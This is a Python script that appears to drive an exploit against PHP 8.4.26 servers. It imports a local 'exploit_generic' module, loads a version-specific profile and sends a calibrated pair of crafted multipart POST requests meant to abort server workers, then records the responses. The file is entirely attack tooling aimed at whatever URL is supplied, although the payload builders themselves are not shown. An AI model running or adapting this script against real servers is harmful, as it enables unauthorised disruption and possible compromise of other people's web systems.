#!/usr/bin/env python3
"""Send the calibrated worker-rotation A/B pair."""

from __future__ import annotations

import argparse
from pathlib import Path
import sys
import time


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import exploit_generic as exploit  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()
    target = exploit.Target.parse(args.url)
    client = exploit.RawHTTP(
        target, timeout=90.0, retries=3, retry_delay=0.25,
        insecure=False, log=exploit.Log(1),
    )
    profile = exploit.load_profile("php-8.4.26-amd64", None, [])
    if args.output_dir:
        args.output_dir.mkdir(parents=True, exist_ok=True)
    body, boundary = exploit.build_rotation_a(profile)
    response_a = client.post_multipart(body, boundary, expected_abort=True)
    if args.output_dir:
        (args.output_dir / "rotate-a.response").write_bytes(response_a)
    time.sleep(0.2)
    body, boundary = exploit.build_rotation_b()
    response_b = client.post_multipart(body, boundary, expected_abort=True)
    if args.output_dir:
        (args.output_dir / "rotate-b.response").write_bytes(response_b)
    print(f"rotate-a={len(response_a)} rotate-b={len(response_b)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
